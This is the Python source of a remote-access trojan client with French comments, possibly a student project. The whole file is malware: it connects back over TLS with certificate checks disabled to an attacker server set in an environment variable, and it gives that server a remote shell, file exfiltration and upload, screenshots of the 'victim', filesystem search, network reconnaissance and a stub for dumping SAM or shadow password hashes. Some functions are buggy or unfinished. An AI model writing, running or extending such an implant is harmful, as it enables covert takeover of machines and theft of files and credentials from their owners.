import socket
import ssl
import subprocess
import os
from dotenv import load_dotenv
from PIL import ImageGrab

SERVER_PORT = 8888

# Fonction permettant d'envoyer la liste des commandes disponibles
def menu_help(ssl_socket):
    # Sauvegarde des explications du menu d'aides
    menu_help_to_send =  "[*] help        : afficher la liste des commandes disponibles.\n"
    menu_help_to_send += "[*] download    : récupération de fichiers de la victime vers le serveur.\n"
    menu_help_to_send += "[*] upload      : récupération de fichiers du serveur vers la victime.\n"
    menu_help_to_send += "[*] shell       : ouvrir un shell (bash ou cmd) interactif.\n"
    menu_help_to_send += "[*] ipconfig    : obtenir la configuration réseau de la machine victime.\n"
    menu_help_to_send += "[*] screenshot  : prendre une capture d'écran de la machine victime.\n"
    menu_help_to_send += "[*] search      : rechercher un fichier sur la machine victime.\n"
    menu_help_to_send += "[*] hashdump    : récupérer la base SAM ou le fichier shadow de la machine.\n"
    menu_help_to_send += "[*] exit        : quitter le programme et déconnexion de la machine victime."
    ssl_socket.send(menu_help_to_send.encode()) # Envoie du menu d'aides au serveur

# Fonction permettant de charger un fichier du serveur
def download(client_socket):
    filename=input("Quel est le nom du fichier : ")
    print('download')
    try:
        client_socket.send(f'download {filename}'.encode())

        server_response = client_socket.recv(1024).decode()
        if server_response == 'File not found':
            print(f"Le fichier {filename} n'a pas été trouvé")
            return
        
        with open(f'received_{filename}', 'wb') as file:
            while True:
                bytes_read = client_socket.recv(4096)
                if not bytes_read:
                    break
                file.write(bytes_read)

        print(f"Le fichier {filename} a été téléchargé avec succès.")
    except Exception as e:
        print(f"Erreur lors du téléchargement du fichier {filename} : {str(e)}")

# Fonction permettant de recevoir un fichier du serveur
def upload(ssl_socket):
    try:
        filename = ssl_socket.recv(4096).decode() # Réception du nom du fichier 
        with open(filename, 'wb') as file:
            while True:
                chunk = ssl_socket.recv(4096)
                if not chunk:
                    break
                file.write(chunk)
    except Exception as e:
        return(f"Erreur lors de la réception du fichier")
        

# Fonction permettant d'accepter un shell depuis le serveur
def shell(ssl_socket):
    repertoire_actuel = os.getcwd()  # Stockage du répertoire actuel
    repertoire_actuel_to_send = f"[*] Répertoire actuel : {repertoire_actuel}"
    ssl_socket.send(repertoire_actuel_to_send.encode())
    while True:
        commande_shell_received = ssl_socket.recv(4096).decode()  # Récupération de la commande Shell du serveur
        if commande_shell_received.lower() == 'quit':  # Gestion de la sortie du Shell
            break
        elif commande_shell_received.lower() == 'help':
            commande_shell_to_send = f"[*] quit        : quiter le shell actif\n"
        elif commande_shell_received.lower().startswith('cd'):
            _, dossier = commande_shell_received.split(' ', 1) # Récupération du répertoire cible de la commande
            os.chdir(dossier)
            repertoire_actuel = os.getcwd() # Mise à jour du répertoire actuel
            commande_shell_to_send = f"[*] Changement de répertoire vers : {repertoire_actuel}\n"
        else:
            commande_shell = subprocess.run(commande_shell_received, shell=True, capture_output=True, text=True, cwd=repertoire_actuel)  # Exécution de la commande Shell dans le répertoire actuel et stockage de ses sorties
            commande_shell_to_send = commande_shell.stdout + commande_shell.stderr  # Concaténation des sorties de la commande Shell
        ssl_socket.send(commande_shell_to_send.encode())  # Envoie de la réponse de la commande Shell

# Fonction permettant d'envoyer la configuration réseau au serveur
def ipconfig(ssl_socket):
    os_type = os.name  # Récupération du nom de l'OS de la machine
    if os_type == "posix":  # Test si la machine est une Linux
        conf = subprocess.run(['ip', 'a'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)  # Exécution de la commande "ip a" et stockage de ses sorties
        conf_to_send = conf.stdout + conf.stderr  # Concaténation des sorties de la commande "ip a"
    elif os_type == "nt":  # Test si la machine est une Windows
        conf = subprocess.run(['ipconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)  # Exécution de la commande "ipconfig" et stockage de ses sorties
        conf_to_send = conf.stdout + conf.stderr  # Concaténation des sorties de la commande "ipconfig"
    else:
        conf_to_send = "OS non reconnu" # Gestion d'erreur
    ssl_socket.send(conf_to_send.encode())  # Envoie de la configuration au serveur

# Fonction permettant d'envoyer la capture d'écran au serveur
def screenshot(ssl_socket):
    screenshot = ImageGrab.grab()  # Capture de l'écran
    screenshot.save('screenshot.png')  # Sauvegarder la capture d'écran dans un fichier
    with open('screenshot.png', 'rb') as screenshot_file:  # Ouverture de la capture d'écran
        while True:
            screenshot_to_send = screenshot_file.read(4096)  # Stockage des données de la capture d'écran
            if not screenshot_to_send:
                break
            ssl_socket.send(screenshot_to_send)  # Envoie de la capture d'écran
    ssl_socket.send(b'END')  # Envoie d'un délimiteur final

# Fonction permettant de localiser le fichier demandé par le serveur
def search(ssl_socket):
    recherche_received = ssl_socket.recv(4096).decode() # Récupération du nom du fichier à rechercher
    recherche = []
    for racine, dirs, dossiers in os.walk("/"): # Parcours du système de fichiers
        if recherche_received in dossiers:
            recherche.append(os.path.join(racine, recherche_received)) # Ajout du chemin du fichier trouvé aux résultats
    if recherche:
        recherche_to_send = "\n".join(recherche) # Concaténation des chemins des fichiers trouvés
    else:
        recherche_to_send = "Aucun fichier trouvé" # Gestion d'erreur
    ssl_socket.send(recherche_to_send.encode()) # Envoi des résultats de la recherche au serveur

# Fonction permettant d'envoyer le fichier shadow au serveur
def hashdump(ssl_socket):
    print('hashdump')




def main():
    # Récupération des variables
    load_dotenv()
    ip_server = os.getenv('IP_SERVER')

    # Création du contexte SSL pour la connexion au serveur
    context = ssl.create_default_context()
    context.check_hostname = False  # Désactivation de la vérification du nom d'hôte du serveur
    context.verify_mode = ssl.CERT_NONE  # Désactivation de la vérification du certificat SSL du serveur

    # Création du socket TCP pour la connexion au serveur
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_socket = context.wrap_socket(client_socket, server_hostname=ip_server)  # Enveloppement du socket avec SSL pour sécuriser la communication
    ssl_socket.connect((ip_server, SERVER_PORT))  # Connexion au serveur en utilisant l'adresse IP et le port de connexion

    # Gestion des commandes reçues par le serveur
    while True:
        command = ssl_socket.recv(4096).decode()
        if command.lower() == 'help':
            menu_help(ssl_socket)
        elif command.lower() == 'download':
            download(ssl_socket)
        elif command.lower() == 'upload':
            upload(ssl_socket)
        elif command.lower() == 'shell':
            shell(ssl_socket)
        elif command.lower() == 'ipconfig':
            ipconfig(ssl_socket)
        elif command.lower() == 'screenshot':
            screenshot(ssl_socket)
        elif command.lower().startswith('search'):
            search(ssl_socket)
        elif command.lower() == 'hashdump':
            hashdump(ssl_socket)
        elif command.lower() == 'exit':
            break
            ssl_socket.close()
    #ssl_socket.close()  # Fermeture du socket

if __name__ == "__main__":
    main()
